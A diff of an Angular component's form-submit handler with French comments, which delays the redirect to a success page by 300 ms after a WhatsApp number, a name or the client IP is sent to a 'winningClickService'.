@@ -386,24 +386,25 @@ export class AccueilComponent implements OnInit {
   //}
 
   handleSubmit(type: string, value: string) {
-    if (type === 'whatsapp' && value) {
-      this.envoyerCondition('whatsapp', value);
-      this.currentStep = null; // WhatsApp validé → stop
-      this.router.navigate(['/success']); // ✅ redirection ici
-    } else if (type === 'whatsapp' && !value) {
-      this.currentStep = 'fullname'; // WhatsApp vide → passer à fullname
-    } else if (type === 'fullname' && value) {
-      this.envoyerCondition('fullname', value);
-      this.currentStep = null; // fullname validé → stop
-      this.router.navigate(['/success']); // ✅ redirection ici
-    } else if (type === 'fullname' && !value) {
-      this.currentStep = 'install'; // nom vide → passer à install
-    } else if (type === 'install') {
-      this.envoyerCondition('install', this.clientIp);
-      this.currentStep = null; // install → stop
-      this.router.navigate(['/success']); // ✅ redirection ici
-    }
+  if (type === 'whatsapp' && value) {
+    this.envoyerCondition('whatsapp', value);
+    this.currentStep = null; // WhatsApp validé → stop
+    setTimeout(() => this.router.navigate(['/success']), 300); // redirection après
+  } else if (type === 'whatsapp' && !value) {
+    this.currentStep = 'fullname'; // WhatsApp vide → passer à fullname
+  } else if (type === 'fullname' && value) {
+    this.envoyerCondition('fullname', value);
+    this.currentStep = null; // fullname validé → stop
+    setTimeout(() => this.router.navigate(['/success']), 300);
+  } else if (type === 'fullname' && !value) {
+    this.currentStep = 'install'; // nom vide → passer à install
+  } else if (type === 'install') {
+    this.envoyerCondition('install', this.clientIp);
+    this.currentStep = null; // install validé → stop
+    setTimeout(() => this.router.navigate(['/success']), 300);
   }
+}
+
 
   envoyerCondition(condition: string, identifier: string) {
     this.winningClickService
